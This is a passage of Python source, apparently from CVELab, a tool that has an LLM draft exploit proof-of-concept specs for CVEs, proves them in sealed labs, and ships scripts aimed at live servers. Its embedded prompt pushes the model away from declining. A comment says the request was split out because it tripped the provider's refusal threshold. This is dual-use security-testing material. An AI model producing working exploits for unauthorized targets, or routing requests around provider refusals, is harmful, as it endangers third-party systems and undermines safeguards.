    carried, and the marker is what finds it.
    """
    validator = lab_dir / "validator" / "validator.py"
    if validator.is_file():
        return validator.read_text(encoding="utf-8")
    poc = lab_dir / "artifacts" / POC_NAME
    if poc.is_file():
        held = poc.read_text(encoding="utf-8").partition(POC_LAB_MODE_MARKER)
        if held[1]:
            return held[2]
    raise RuntimeError(
        f"No lab mode to carry: {lab_dir} has neither validator/validator.py nor an "
        f"artifacts/{POC_NAME} written by this CVELab"
    )


def _proven_spec(lab_dir: Path) -> tuple[dict[str, Any], int, dict[str, str]] | None:
    """The spec this lab already proved, if one is on record.

    Reusing it is what makes asking twice give the same answer. A drafted
    spec is sampled, so without this a lab that handed over a script one day
    could refuse the next with nothing having changed.
    """
    held = poc_record(lab_dir)
    if poc_standing(held) != POC_SHIPPED:
        return None
    port = held["container_port"]
    try:
        spec = validate_spec(held["spec"])
    except (ValueError, TypeError):
        return None
    return spec, port, _lab_values(
        json.dumps(held.get("lab_values") or {}), spec["inputs"]
    )


def draft_only(
    lab_dir: Path,
    *,
    api_key: str | None = None,
    model: str | None = None,
    provider: str | None = None,
    base_url: str | None = None,
) -> dict[str, Any]:
    """Ask for a spec, check it, and hand it back without proving anything.

    One model call against a lab already on disk: no images built, no
    containers started, no sidecar. It exists because the loop for working on
    the instructions was a whole `auto` run -- clone, research, build, repair,
    validate, twenty minutes and a dollar -- to see what one sentence changed
    about one answer. Most of what went wrong with the instructions was
    visible in the spec alone: a name nothing bound, a probe with no send, a
    strategy whose channel the lab had replaced.

    What comes back is the drafted spec as validate_spec normalised it, or
    the reason there is none. Nothing is written to the lab, so a draft taken
    this way cannot be mistaken later for one that was proved.
    """
    lab_dir = lab_dir.resolve()
    plan = _lab_plan(lab_dir)
    cve = str(plan.get("cve") or lab_dir.name).upper()
    if not ai_is_configured(api_key, model, provider):
        raise RuntimeError("Configure a model to ask for a spec: see `cvelab doctor`")
    progress.step("asking whether the effect can be shown on one instance")
    drafted = draft_manual_poc_spec(
        cve, plan, api_key=api_key, model=model, provider=provider,
        base_url=base_url, lab_dir=lab_dir,
    )
    answer: dict[str, Any] = {
        "ok": "spec" in drafted,
        "cve": cve,
        "lab_dir": str(lab_dir),
        "proved": False,
        "note": "a draft only: nothing was run against the lab",
    }
    if "spec" not in drafted:
        return {**answer, **drafted}
    return {
        **answer,
        "container_port": drafted["container_port"],
        "strategy": drafted["spec"]["strategy"],
        "transport": drafted["spec"]["transport"],
        "spec": drafted["spec"],
        **({"lab_values": drafted["lab_values"]} if drafted.get("lab_values") else {}),
    }


def run_manual_poc(
    lab_dir: Path,
    spec_path: Path | None = None,
    container_port: int | None = None,
    keep: bool = False,
    assume_yes: bool = False,
    inputs: dict[str, str] | None = None,
    redraft: bool = False,
    *,
    api_key: str | None = None,
    model: str | None = None,
    provider: str | None = None,
    base_url: str | None = None,
) -> dict[str, Any]:
    """Prove a spec against a built lab, and hand over the script.

    The spec is the operator's when `spec_path` names one, and otherwise is
    asked for in a call of its own. Either way CVELab's half is the same: run
    the emitted script against the lab's two builds and keep it only if it
    shows the effect on one and stays silent on the other.

    It works on any lab already generated and validated, including one built
    by someone else, and it touches neither the lab's status nor its own
    deliverables: a refused spec leaves the lab exactly as it was.
    """
    lab_dir = lab_dir.resolve()
    asked_for = False
    known: dict[str, str] = {}
    plan = _lab_plan(lab_dir)
    cve = str(plan.get("cve") or lab_dir.name).upper()
    _require_reproduced(lab_dir)
    if spec_path is not None:
        try:
            offered = json.loads(spec_path.read_text(encoding="utf-8"))
        except json.JSONDecodeError as error:
            raise RuntimeError(f"{spec_path} is not valid JSON: {error}") from error
        spec = validate_spec(offered)
        if container_port is None:
            raise RuntimeError(
                "--container-port is the port the service listens on inside its "
                "container, and a spec cannot be proved without it"
            )
    elif (held := None if redraft else _proven_spec(lab_dir)) is not None:
        spec, container_port, known = held
        progress.step("reusing the spec this lab already proved; --redraft asks again")
    else:
        if not ai_is_configured(api_key, model, provider):
            raise RuntimeError(
                "Pass --spec to prove your own, or configure a model so one can be "
                "asked for: see `cvelab doctor`"
            )
        progress.step("asking whether the effect can be shown on one instance")
        drafted = draft_manual_poc_spec(
            cve, plan, api_key=api_key, model=model, provider=provider,
            base_url=base_url, lab_dir=lab_dir,
        )
        if "spec" not in drafted:
            # Not an error in the tool: most effects cannot be shown this way,
            # and the answer says which this is.
            progress.step(f"nothing to hand over: {drafted['reason']}")
            return {"ok": False, "cve": cve, "lab_dir": str(lab_dir), "shipped": False,
                    **drafted}
        spec = drafted["spec"]
        container_port = container_port or drafted["container_port"]
        drafted = {**drafted, "container_port": container_port}
        asked_for = True
    timeout = int(spec.get("health_timeout", DEFAULT_HEALTH_TIMEOUT)) + startup_grace()

    vulnerable_only = plan.get("lab_type") == "VULNERABLE_ONLY_REPRODUCTION"
    needed = ("vulnerable",) if vulnerable_only else ("vulnerable", "patched")
    services = [s for s in (plan.get("startup_services") or []) if s in needed or
                s not in ("vulnerable", "patched")]
    for required in needed:
        if required not in services:
            services.append(required)

    docker, environment, compose, scratch = prepare_compose(lab_dir)
    try:
        resolved = _resolved_compose(compose, lab_dir, environment)
        _bring_up(
            services, list(needed), container_port, timeout,
            lab_dir, compose, docker, environment, resolved,
        )
        if asked_for:
            probed = container_port

            def ready(port: int) -> None:
                """A later draft may name another port than the one waited on."""
                nonlocal probed
                if port != probed:
                    _bring_up(
                        services, list(needed), port, timeout,
                        lab_dir, compose, docker, environment, resolved,
                    )
                    probed = port

            spec, container_port, outcome = _prove_drafted_spec(
                cve, plan, drafted, lab_dir, compose, environment,
                assume_yes, inputs, api_key=api_key, model=model,
                provider=provider, base_url=base_url, before_each=ready,
            )
        else:
            # The spec is the operator's, or one this lab already proved.
            # Neither is ours to redraft.
            progress.step("proving the single-target script against both builds")
            outcome = prove_manual_poc(
                cve, spec, container_port, lab_dir, compose, environment, plan,
                assume_yes, dict(known, **(inputs or {})),
            )
            outcome.pop("spec_at_fault", None)
    finally:
        if not keep:
            _seal_lab(compose, lab_dir, environment)
        shutil.rmtree(scratch, ignore_errors=True)

    write_manual_poc(cve, lab_dir, plan, spec, container_port, outcome)
    if not outcome["shipped"]:
        progress.step(f"nothing handed over: {outcome.get('reason')}")
    return {"ok": bool(outcome["shipped"]), "cve": cve, "lab_dir": str(lab_dir), **outcome}


#: One line per strategy, saying how a run decides. Every strategy CVELab
#: will accept needs an entry, which a test asserts: a guide that describes a
#: different script than the one beside it is worse than no guide.
_GUIDE_HOW = {
    "inband_differential":
        "It reads the same resource two ways in one request round -- the way the "
        "vulnerability allows and the way that authorizes correctly -- and reports "
        "what only the first returned. A value it prints is one the server "
        "disclosed to a requester that should not have seen it.",
    "marker_roundtrip":
        "It sends a marker, fresh on every run, through the vulnerable vector and "
        "looks for it where it should not appear. Because the marker is new each "
        "time, a reflection left by an earlier run is never counted.",
    "oob_callback":
        "It starts a listener of its own, sends a payload that names it, and waits. "
        "The effect produces no answer to read, so the evidence is the target "
        "reaching out, carrying a marker generated for this run.",
    "direct_observation":
        "It sends the request the weakness allows and reads the one response. The "
        "evidence is that this response came back at all -- a fixed build does not "
        "produce it, which is what CVELab checked before shipping the script.",
    "service_crash":
        "It asks an ordinary question, sends the input that kills the service, then "
        "asks the ordinary question again. The finding is that the instance "
        "answered the first time and does not answer the last. A payload that "
        "merely returns an error is reported as no crash, because an answer means "
        "the service is still serving.",
    "timing_differential":
        "It times the same request twice over: with the input that triggers the "
        "blowup, and with ordinary input of the same shape, the benign ones first "
        "while the instance is idle. It takes medians over several measurements and "
        "reports only when the payload is both slow outright and far slower than "
        "its control, so a route that is simply slow is not a finding.",
}


def _remote_mode_note(
    cve: str,
    spec: dict[str, Any],
    plan: dict[str, Any],
    port: int,
    filename: str = POC_NAME,
) -> str:
    """Remote mode's half of the artifact's own header.

    This was `Manual-PoC.md`, a document beside the script. It is in the
    script now, because the measurement that started this was that the two
    files could not be told apart by a reader standing up: both opened with
    the identical line `# <CVE> Manual PoC`, and only one of them reached a
    live server. A header cannot be separated from the program it describes.
    """
    strategy = spec["strategy"]
    # Keyed on the strategy, every one of them. This was an if/else on
    # inband_differential against everything else, which meant the note for
    # a direct_observation script told the operator it sends a marker, and
    # would have told a service_crash operator it only reads.
    how = _filled(_GUIDE_HOW[strategy])
    # The same text the footprint block carries, so the two cannot drift, and
    # it already accounts for an upload or an authenticated session.
    leaves = _poc_footprint(spec)
    crashes = strategy == "service_crash"
    gate = (
        "\nIt will not run without --allow-disruption, and that is deliberate: the\n"
        "payload is expected to leave the service not answering, which on anything\n"
        "shared or in production is an outage. Nobody restarts it for you. Have the\n"
        "owner's agreement in writing before you type it.\n"
        if crashes else ""
    )
    declared = list(spec.get("inputs") or ())
    inputs_note = (
        "\n"
        + _filled(
            "This PoC needs values only you have, and refuses to start without them: "
            + ", ".join(declared)
            + ". Pass each as --input NAME=VALUE."
        )
        + "\n"
        + (
            "\nWhere one of them names a path, that is because the affected project "
            "ships no\nserver of its own: your application is what calls it, and the "
            "route that reaches\nthe vulnerable code is yours, not the project's. Point "
            "it at a route of yours\nthat passes a request through the affected library. "
            "A route that never reaches it\nwill report NOT_OBSERVED, which means "
            "nothing was tested rather than nothing is\nwrong.\n"
            if any("path" in name or "route" in name for name in declared) else ""
        )
        if declared else ""
    )
    project = plan.get("repository") or "the affected project"
    if plan.get("lab_type") == "VULNERABLE_ONLY_REPRODUCTION":
        trust = (
            f"CVELab built the affected revision of {project} and ran this exact\n"
            f"program against it, on port {port} inside the container, before writing\n"
            "it here. It observed the effect.\n\n"
            "There was no fixed revision to compare against -- the project publishes no\n"
            "resolvable patched build for this one -- so that half of the usual check is\n"
            "missing. What stands in for it is the strategy: a "
            f"{strategy} run carries\nits own control, so the effect it reports is "
            "one the same instance does not\nproduce when asked the legitimate way. That is "
            "weaker evidence than a patched\nbuild staying silent, and worth saying plainly "
            "in a report: this shows the\neffect happening, not that a fix removes it.\n"
        )
    else:
        trust = (
            f"CVELab built both revisions of {project}\n"
            f"and ran this exact program against each, on port {port} inside the\n"
            "container, before writing it here. It observed the effect on the vulnerable\n"
            "build and stayed silent on the fixed one. A program that fired on both would\n"
            "be watching normal behaviour rather than the bug, and would not have been\n"
            "written.\n"
        )
    if spec.get("setup"):
        # Said where the operator will read it. The lab was empty, so CVELab
        # put the object there before proving the script; a target that holds
        # no such object will report nothing, and that is not a clean bill.
        trust += (
            "\nThe lab started empty, so CVELab created what the weakness acts on "
            "before\neach run, through the lab's own setup route, and on both builds "
            "alike. That\nsetup is not in this file and does not need to be: an "
            "instance in use\nalready holds objects of that kind. What it does mean is "
            "that a target\nholding none will report NOT_OBSERVED whether or not it is "
            "vulnerable, so\nread a silent run against an empty instance as nothing "
            "learned.\n"
        )
    return f"""REMOTE MODE -- one instance whose address you supply:

{_poc_usage(spec, filename)}{gate}
The target is one host and port, however you write it: 10.0.0.5:8080,
[2001:db8::1]:8443, app.example.com or https://app.example.com. Without a
scheme it assumes http, so the target carries no path. --target takes the same
value named rather than positional.
{inputs_note}
Without --show-bodies each disclosed value is cut at 120 characters; with it
they print in full, which is what a report needs as evidence. Add --insecure
for a self-signed certificate and --json for machine-readable findings.

It names the target and the effect on stderr before it sends anything, so the
run is visible in the output and in whatever log captured it. It sends live
requests against a real server, so point it only at a host your engagement
covers, and keep that permission in writing: what it demonstrates happens for
real on the instance you aim it at.

WHAT IT MEANS

Exit 0 and OBSERVED is the effect on that target. Exit 1 and NOT_OBSERVED
means the effect was not seen there with this input -- which is not the same
as patched. A differential strategy also prints it when the instance simply
held nothing to disclose. To decide affected against fixed regardless of the
data, check the build. Any other ending is a run that did not finish, not a
result.

HOW IT DECIDES

Strategy: {strategy}
{how}

WHAT IT DOES TO THE TARGET

It sends the requests in its embedded SPEC and nothing else. It does not
escalate, create accounts, write files or plant anything to make the effect
easier to see, and it asks for no more than the observation needs. Read SPEC
below to see every request before you run it. The requests carry
User-Agent: CVELab-Field-PoC/1.0, so the target's own logs can be matched to
your run.

{leaves}
WHY YOU CAN TRUST IT

{trust}
REHEARSE IT FIRST

`cvelab demo-target up <lab-dir>` starts this lab's vulnerable build on a
network your host can reach and prints the host and port to point at, so you
can see the run end to end before it touches anyone else's server. The fixed
build is never started, and `cvelab demo-target down <lab-dir>` puts the lab
back.
"""

def _demo_override(networks: list[str]) -> str:
    """A Compose fragment that makes the lab's own networks reachable.

    A lab is sealed: its network is `internal: true` and it publishes no port,
    so neither a published port nor the container's own address answers from
    the host. Publishing a port while the network stays internal binds to the
    wrong address, so the fragment lifts `internal` instead and the target is
    the container's address on its own port.

    It is never written into the lab directory and never named
    docker-compose.override.yml, which Compose loads by name: left behind,
    either would quietly change every later run of the lab.
    """
    body = "".join(f"  {name}:\n    internal: false\n" for name in networks)
    return (
        "# Written by `cvelab demo-target up` and used for that one command.\n"
        "# It lifts `internal` from this lab's networks so the host can reach\n"
        "# the vulnerable build, which the lab is deliberately built not to\n"
        "# allow. `cvelab demo-target down <lab-dir>` puts the lab back.\n"
        f"networks:\n{body}"
    )


def _container_address(container: str) -> str:
    """The container's own addresses, space separated, nearest network first."""
    shown = _docker(
        "inspect", "--format",
        "{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}",
        container, check=False,
    )
    return " ".join(candidate for candidate in shown.split() if candidate)


def run_demo_target(
    action: str, lab_dir: Path, container_port: int | None = None
) -> dict[str, Any]:
    """Start a lab's vulnerable build where the host can reach it, or put it back.

    This is a rehearsal target for the single-target script: it gives the
    operator a real host and port to point at before they point it at a server
    that belongs to someone else. The fixed build is never started -- the
    differential is the lab's job, already done, and a demo that reached the
    fixed build by accident would show nothing.
    """
    lab_dir = lab_dir.resolve()
    plan = _lab_plan(lab_dir)
    cve = str(plan.get("cve") or lab_dir.name).upper()
    docker, environment, compose, scratch = prepare_compose(lab_dir)
    try:
        if action == "down":
            _seal_lab(compose, lab_dir, environment)
            progress.step(f"{cve} is back to its sealed posture")
            return {"ok": True, "cve": cve, "lab_dir": str(lab_dir), "running": False}

        port = container_port
        if port is None:
            with contextlib.suppress(KeyError, TypeError, ValueError):
                port = int(poc_record(lab_dir)["container_port"])
        if port is None:
            raise RuntimeError(
                "No port to point at: pass --container-port, or run `cvelab manual` "
                "first, which records the one it proved in report.json under "
                "manual_poc_field"
            )

        resolved = _resolved_compose(compose, lab_dir, environment)
        internal = [
            name for name, definition in (resolved.get("networks") or {}).items()
            if isinstance(definition, dict) and definition.get("internal")
        ]
        if internal:
            override = scratch / "demo-target.yml"
            override.write_text(_demo_override(internal), encoding="utf-8")
            compose = [*compose, "-f", str(override)]

        services = [
            name for name in (plan.get("startup_services") or ["vulnerable"])
            if name != "patched"
        ]
        if "vulnerable" not in services:
            services.append("vulnerable")
        timeout = DEFAULT_HEALTH_TIMEOUT + startup_grace()
        _bring_up(
            services, ["vulnerable"], port, timeout,
            lab_dir, compose, docker, environment, resolved,
        )
        container = _service_container(compose, "vulnerable", lab_dir, environment)
        address = _container_address(container).split(" ")[0] if container else ""
        if not address:
            raise RuntimeError("the vulnerable build started but has no address to reach")
    finally:
        shutil.rmtree(scratch, ignore_errors=True)

    target = f"{address}:{port}"
    script = lab_dir / "artifacts" / POC_NAME
    # Printed only where remote mode exists. The rehearsal is of remote mode;
    # a lab whose remote mode was refused would have this line answer with the
    # drafter's reason and exit 2, which reads as the rehearsal having failed.
    proved = script.is_file() and poc_standing(poc_record(lab_dir)) == POC_SHIPPED
    progress.step(f"{cve} vulnerable build is reachable at {target}")
    if proved:
        progress.step(f"python3 {script} --target {target} --show-bodies")
    progress.step(f"this lab is reachable from the host until: cvelab demo-target down {lab_dir}")
    return {
        "ok": True,
        "cve": cve,
        "lab_dir": str(lab_dir),
        "running": True,
        "target": target,
        "poc": str(script) if proved else None,
        "posture": "reachable from the host; `cvelab demo-target down` restores it",
    }


# --- Asking for a spec, after the lab is finished ----------------------------
#
# The lab's verdict is recorded before this runs, and nothing here can change
# it. That placement is the whole point. Asking for a spec inside the
# generation prompt pushed that prompt past the provider's threshold: two of
# three CVEs that had validated minutes earlier with the same model came back
# PROVIDER_DECLINED on the first attempt, so the lab was lost, not just the
# extra. Asked separately, a decline costs one small call.
#
# A decline is recorded and never retried or reworded. The artifact asked for
# is the same however the request is phrased, so rewording would only be an
# attempt to get past an answer the provider already gave.

#: What the call may answer. The spec travels as JSON text in one string field
#: rather than as an object: a schema carrying additionalProperties: true is
#: rejected outright by Anthropic, and a spec's request shapes cannot be
#: spelled out in a closed schema anyway. validate_spec checks the shape, so
#: passing it as text loses nothing.
#: Enough for the contract and the revisions; the lab's own files are not sent.
_MAX_DRAFT_INPUT = 40_000


MANUAL_POC_DRAFT_SCHEMA = {
    "type": "object",
    "additionalProperties": False,
    "required": ["feasible", "reason", "container_port", "spec_json", "lab_values_json"],
    "properties": {
        "feasible": {"type": "boolean"},
        "reason": {"type": "string"},
        "container_port": {"type": ["integer", "null"]},
        "spec_json": {"type": ["string", "null"]},
        # Values for the spec's own inputs, good for this lab only, so the
        # script can be proved here. Without them a spec that declares an
        # input -- which is the right answer whenever the effect needs an
        # account or an object the operator owns -- can never be proved, and
        # three labs in one afternoon were refused for exactly that.
        "lab_values_json": {"type": ["string", "null"]},
    },
}

_DRAFT_INSTRUCTIONS = (
    "A CVE reproduction lab has already been built and validated: it compiled a vulnerable "
    "and a fixed revision of the project, ran its validator against both, and confirmed the "
    "effect occurs on the vulnerable revision and not on the fixed one. That work is "
    "finished and recorded, and nothing in your answer changes it.\n\n"
    "the_differential_is_already_measured holds that measurement, and it is CVELab's "
    "verdict rather than a reading offered for you to check. effect_predicate is the "
    "predicate the effect was judged against, effect_evidence is the clause-by-clause "
    "result on each build, and differential_confirmed is the verdict. Where "
    "differential_confirmed is true, the effect was observed on the vulnerable build and "
    "not on the fixed one, and that is settled. Where it is false and "
    "a_fixed_build_was_tested is false, the project published no resolvable patched "
    "revision, no second build was ever run and there was no differential to confirm: the "
    "vulnerable lines of effect_evidence are the verdict there, and that is not a reason "
    "to answer feasible=false either.\n"
    "  So you are not being asked whether the vulnerability is real, or whether the lab "
    "proved it. Both are decided. The only question put to you is whether that same "
    "already-confirmed effect can also be observed against a single live instance. Do not "
    "re-derive the differential from the bodies in what_the_validator_observed, and do "
    "not answer feasible=false because you read those bodies differently than the "
    "predicate did. A draft that re-opens the differential is answering a question nobody "
    "asked.\n"
    "  Two drafts did re-open it and both got it backwards. One read a vulnerable body "
    "holding six runs objects -- the first \"tail_nonzero\": false, the five after it true "
    "-- and reported that the lab \"found tail_nonzero false on both the vulnerable and "
    "the patched build\". The other swapped the builds outright, quoting the patched "
    "build's confirmed=false and its stripped filename as the vulnerable build's. In both "
    "the predicate, the evidence and differential_confirmed said the opposite, and both "
    "refused a demonstration that was there to be written.\n"
    "  What you may still refuse for is unchanged, and none of it is the differential: an "
    "effect one instance genuinely cannot express, and an effect whose only evidence comes "
    "through a route the lab invented. Both are set out below.\n\n"
    "Decide one thing. Can the effect the lab already confirmed also be shown by one script "
    "pointed at one running instance, with no second instance to compare against? Some "
    "vulnerabilities cannot: a race that needs two clients driven at once, a memory or "
    "register state visible only inside the process, an effect that needs a second host "
    "you control, a weakness in a client rather than a server. When this one cannot, "
    "answer feasible=false and give the reason.\n"
    "  Four things that used to be answered feasible=false are now expressible, and "
    "answering feasible=false for them is the wrong answer. A crash, a panic or a hang "
    "is service_crash: the service answering before the payload and not after is the "
    "observation, and an outage is an impact an operator cares about more than most. An "
    "algorithmic blowup -- a pathological regular expression, a quadratic parser, a "
    "decompression bomb -- is timing_differential: the same request shape with ordinary "
    "input is the control, and from outside the process the wall clock is exactly where "
    "that effect shows. A project that ships no listener of its own is not out of reach "
    "either: see the paragraph on a library below. And an effect needing a route a stock "
    "instance does not serve is an input, not a refusal -- also below.\n\n"
    "Three things that sound like obstacles are not. The service need not speak HTTP. The "
    "effect need not come back in an answer. And a write the demonstration itself requires "
    "is allowed: where the effect is the write -- a record created that should have been "
    "refused, an entry added to shared configuration, a field changed by a caller who may "
    "not change it -- performing it is how it is shown, and marker_roundtrip is the strategy "
    "for it. What is not allowed is damage past what the demonstration needs: deleting what "
    "is there, or touching anything the demonstration does not need to touch. Taking the "
    "service down is in that class too, with one exception: where the finding IS that the "
    "service goes down, service_crash is the strategy for it, the script refuses to run "
    "without --allow-disruption, and its header says plainly that it causes an outage. Do "
    "not reach for it for anything else -- a crash is not a shortcut to showing a bug whose "
    "real effect is an answer.\n"
    "  Where the finding is that a request is accepted at all, you often need not "
    "complete the action to show it. A check the fixed build makes before the request "
    "reaches the code -- a CSRF token, an Origin, a signature, an authorization header "
    "-- answers with its own refusal, and answers that way whatever the rest of the "
    "request says. So a forged request carrying deliberately unusable values still "
    "separates the two builds: the fixed one refuses it before looking, the affected one "
    "lets it reach a view that then rejects the values. Changing a victim's password to "
    "show that the change was allowed is damage you do not need.\n\n"
    "When it can, answer feasible=true, give container_port, the port the service listens on "
    "inside its container, and put the spec in spec_json as a JSON string with these keys.\n"
    "  transport: http when the service speaks HTTP, which is the default and may be left "
    "out; tcp when it speaks its own protocol over a plain socket, a cache, a queue, a "
    "database or a daemon with a text protocol; tls for the same wrapped in TLS; ws or wss "
    "when the effect is in frames after a WebSocket upgrade, with ws_path naming the "
    "upgrade route -- the route the service actually serves, which is rarely / -- and "
    "ws_headers adding headers to the upgrade request itself, which is where an Origin a "
    "server is supposed to reject belongs; a message is send and read_until as over a "
    "socket; ssh when "
    "the weakness is in what an authenticated session may do, such as a file an account "
    "should not be able to read or a restricted shell that can be escaped; smb when it is "
    "in what a share or a path exposes. The service not speaking HTTP is not a reason to "
    "answer feasible=false.\n"
    "  Over ssh a message is {\"exec\": \"<command>\"} and what the sequence returns is "
    "the output; over smb it is {\"op\": \"list_shares\"} or {\"op\": \"list_path\", "
    "\"share\": \"<name>\", \"path\": \"/\"} or {\"op\": \"read\", \"share\": "
    "\"<name>\", \"path\": \"/file\"}. Both authenticate through auth, whose values "
    "come from inputs, as {\"username\": \"{{user}}\", \"password\": "
    "\"{{password}}\"} -- never a credential written into the spec. Over ssh auth "
    "takes username, password and private_key; over smb username, password and "
    "domain. These reach access "
    "and what a session is permitted to do; they are not a way to attack the handshake, so "
    "do not propose one for a flaw in the protocol implementation itself.\n"
    "  strategy: direct_observation, inband_differential, marker_roundtrip, "
    "oob_callback, service_crash or timing_differential, exactly one of those six "
    "spellings and no other.\n"
    "  observable_effect: one sentence naming what a run shows.\n"
    "  extract, wherever it appears -- in a discover step, in inband_differential, in a "
    "direct_observation expectation -- is exactly one of four things. {\"json_values\": "
    "\"<key>\"} takes every value under that key anywhere in a JSON body. {\"regex\": "
    "\"<pattern>\"} takes what one capture group matches, out of whatever the response is: "
    "this is how a token is pulled from served HTML, a parameter such as state out of a URL, "
    "or a value out of a line of a protocol transcript. {\"header\": \"<name>\"} takes "
    "that response header. {\"status\": true} takes the status code. A response that is not "
    "JSON, or a value sitting inside a larger string, is a reason to reach for regex and not "
    "a reason to answer feasible=false.\n"
    "  For direct_observation, which fits most authorization and disclosure findings and "
    "is the one to reach for first: probe, a list of requests asking the way the weakness "
    "allows, and expect, exactly one of {\"status\": <code>} when the finding is the "
    "status itself -- any code, not only 200: a route answering 200 where it should "
    "refuse, and equally a 401 where a fixed build answers 403, are both expressed this "
    "way -- {\"header\": \"<name>\"} when the evidence is a response "
    "header, {\"body_contains\": \"<text>\"} for a literal, or {\"extract\": {...}} "
    "when a value has to be pulled out. status and header are http only: every other "
    "transport returns what was read and no status line, so there match the bytes with "
    "body_contains or extract. Over ws and wss they read the upgrade response, which is "
    "what an Origin check needs: {\"status\": 101} is the finding when the server accepts "
    "an upgrade carrying an Origin it should refuse, and the fixed build's refusal is the "
    "silence. The effect is that this response came back at all; "
    "CVELab checks that a fixed build does not produce it, so no second reading is needed. "
    "Do not use inband_differential for this shape: comparing an unauthenticated read "
    "against an authorized one finds nothing on the vulnerable build, because both see the "
    "data, and finds the refusal on the fixed build, which is backwards.\n"
    "  For inband_differential, when the same reading authorized correctly genuinely "
    "withholds part of what the weakness returns, such as a field a different query shape "
    "hides: probe, a list of requests reading the resource the way the "
    "weakness allows; control, a list of requests reading the same resource the way that "
    "authorizes correctly; and extract, one of the four. A run reports what probe returned and control did not, so "
    "control must be the correctly authorized reading of the same resource, not a different "
    "one.\n"
    "  For oob_callback, when the effect produces no answer at all -- a blind injection, a "
    "blind fetch of a URL the caller supplies, a command whose output goes nowhere: probe, a "
    "list of requests of which at least one places both {{callback}} and {{marker}}, with "
    "the marker inside the callback the payload builds, as in "
    "http://{{callback}}/{{marker}}. The script listens on its own port, substitutes where "
    "it can be reached, and a run counts only when something arrives carrying that marker. "
    "An effect with no answer is a reason to use this strategy, not a reason to answer "
    "feasible=false.\n"
    "  For marker_roundtrip, which is also where a finding whose effect is a write belongs: "
    "probe, a list of requests of which at least one places the "
    "literal {{marker}}; observe, one request; and match, {\"body_contains\": \"{{marker}}\"}. "
    "Put {{marker}} in what gets written -- a name, a label, a free-text field of the object "
    "the weakness lets the caller create or change -- and let observe read that object back. "
    "The marker then shows both that the write landed where it should have been refused and "
    "that this run is what put it there. "
    "Only observe's body is read and the probe responses are discarded, so when the effect is "
    "visible only in the response to the request that causes it, that request belongs in "
    "observe.\n"
    "  For service_crash, when the effect is that the service stops serving -- an "
    "unrecovered panic, an abort, an uncaught exception that takes the process with it, a "
    "hang that never answers again: baseline, a list of requests that any working instance "
    "answers, such as a health route or the index; and probe, the requests carrying the "
    "input that kills it. A run sends baseline, then probe, then baseline again, and counts "
    "only when the instance answered the first time and does not answer the last. So "
    "baseline must be something ordinary and cheap that does not itself depend on the "
    "weakness -- if it is the same request as the probe, the run can say nothing. A payload "
    "that merely returns an error is not this strategy: a 500 is an answer, and an answer "
    "means the service is still serving, so use direct_observation with {\"status\": 500} "
    "instead.\n"
    "  For timing_differential, when the effect is time -- a regular expression that "
    "backtracks, a parser that goes quadratic, an input that makes the service do far more "
    "work than its size suggests: probe, the requests carrying the pathological input; and "
    "control, the same requests with ordinary input of comparable size. The control is what "
    "makes the measurement mean anything, so it has to be the same route and the same shape, "
    "differing only in the input the weakness is about -- a different endpoint proves "
    "nothing. A run measures each several times, alternating, and compares medians. It "
    f"counts only when the payload takes at least {MIN_TIMING_SECONDS} seconds outright and "
    f"at least {MIN_TIMING_RATIO} times the control, and you may raise either bar with "
    "min_seconds and min_ratio where the effect is stronger than that, which makes the "
    "claim harder rather than easier. You may not lower them. repeats sets how many "
    f"measurements each side gets, up to {MAX_TIMING_REPEATS}. Choose an input whose cost "
    "is in the algorithm and not in its length: a payload that is simply enormous shows "
    "bandwidth, not the weakness.\n"
    "  Over http a request is {\"method\": \"GET\", \"path\": \"/x\", \"headers\": {}, "
    "\"body\": null}. The requests share a session: a cookie the target sets is sent back "
    "on every request after it, discovery steps included, so a login handshake is written "
    "as what it is -- read the page for a token, post the credentials, then make the "
    "request that needs the session, in that order. A Cookie header the spec writes itself "
    "always wins. A body is text, or a JSON object or array "
    "written as itself and serialised for you -- do not escape it into a string. A body is "
    "not how a file is sent, though: an upload has its own key, below. Over tcp or tls a "
    "message is instead "
    "{\"send\": \"<text, with \\r\\n where the protocol needs it>\", "
    "\"read_until\": \"<the reply delimiter>\"}, or send_hex with an even-length hex string "
    "when the framing is not text; a whole sequence shares one connection, so a protocol "
    "needing a login or a handshake command first is expressed by putting it earlier in the "
    "same list, and what a sequence returns is everything read during it. A message that "
    "sends nothing is {} with neither key, which is how a banner is taken and how an Origin "
    "check on a WebSocket upgrade is written: no frame is sent at all, because the finding "
    "is the handshake.\n"
    "  discover runs over http, and also over ws and wss, where its steps are ordinary "
    "requests to the same host and port that serves the upgrade -- that is how a token "
    "served in HTML is read first and then used in the frames. It is not available over "
    "tcp, tls, ssh or smb.\n"
    "  Paths and messages name no host: the operator supplies the one target at run time, so "
    "a hostname anywhere in the spec is wrong.\n"
    "  A request may also use {{target}}, the host and port the operator pointed the script "
    "at, and {{targetHost}}, that host alone. A spec names no host, but an effect can be "
    "about the target's own address -- an Origin or Referer the server is supposed to "
    "reject, a rebinding check, a redirect back to itself -- and only the run knows it.\n"
    "  inputs: a list of names for values this lab cannot know and the operator supplies at "
    "run time: a test account's credential, an administrator's credential on their own "
    "instance, a tenant id, the id or title of an object they own, the name of a share. A request fills one in as "
    "{{name}}. Declare one rather than guessing a credential, and rather than answering "
    "feasible=false because a value is missing.\n"
    "    An input is not only a value. Where the project ships no server of its own, the "
    "route is the input, and it belongs to the operator rather than to the project. There "
    "is no path to hardcode, because the project serves none and the lab's own adapter "
    "route is not on anyone's instance -- so the path itself is what you declare, as "
    "{\"path\": \"{{target_path}}\"}, with the lab's adapter route given in "
    "lab_values_json as its value so the script can still be proved here. \"This project "
    "ships no listener of its own\" is therefore the condition that calls for this "
    "pattern, and never a reason to answer feasible=false. Read it as the signal to "
    "declare the route.\n"
    "    Measured, because the same sentence was being used both ways: of the shipped "
    "component PoCs, 11 of 12 declare an operator-supplied input and 9 of those name it "
    "target_path -- while 19 of 48 declines gave \"ships no listener of its own\" as the "
    "reason for declining. One lab asked nine times produced six scripts and three "
    "refusals, each refusal explaining at length that a library with no listener cannot "
    "be shown on one instance; six scripts for that same library already existed, on "
    "identical input. If you are about to write that sentence as a reason, you have found "
    "the pattern rather than an obstacle.\n"
    "  A check may also carry discover: up to six steps, each binding one value under a name "
    "that probe, control and observe fill in as {{name}}. A step is either {\"bind\": "
    "\"<name>\", \"query\": [<requests of any method>], \"extract\": {<one of the four "
    "above>}}, which runs the requests and binds every value the extractor pulls out of "
    "the last response, the run then repeating for each one; or {\"bind\": \"<name>\", "
    "\"derive\": \"<text holding {{an_already_bound_name}}>\"}, which binds a value "
